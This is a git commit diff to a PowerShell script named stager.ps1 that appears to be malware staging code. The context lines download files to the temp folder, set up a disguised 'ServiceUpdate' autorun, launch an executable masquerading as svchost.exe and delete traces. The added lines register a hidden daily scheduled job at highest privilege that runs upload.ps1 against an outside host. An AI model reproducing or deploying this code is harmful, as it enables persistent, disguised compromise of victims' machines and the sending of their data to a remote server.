311603f1429505b26520f7d93b30fe18a06080c4
Colin Cowie <ccowie@purdue.edu>
2019-04-24 11:36:59 -0400

    Update stager.ps1

--- stager.ps1
+++ stager.ps1
@@ -7,3 +7,6 @@ Invoke-WebRequest -Uri $url3 -OutFile "$env:temp\upload.ps1"
 & "$env:temp\AutoRun.ps1" -name "ServiceUpdate" -run "$env:temp\svchost.exe" -description "Service Updater"
 Start-Process -Filepath "$env:temp\svchost.exe"
 Remove-Item –path "$env:temp\AutoRun.ps1"
+$Trigger= New-ScheduledTaskTrigger -At 10:00am –Daily
+$Action= New-ScheduledTaskAction -Execute "upload.ps1" -Argument "http://generalkenobi.x10host.com/upload.ps1"
+Register-ScheduledJob –Name ”Sneaky sneaky” -Trigger $Trigger -Action $Action -RunLevel Highest –Force
